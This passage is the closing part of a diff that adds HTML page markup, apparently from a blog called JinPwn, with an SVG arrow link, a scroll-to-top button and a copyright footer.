+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
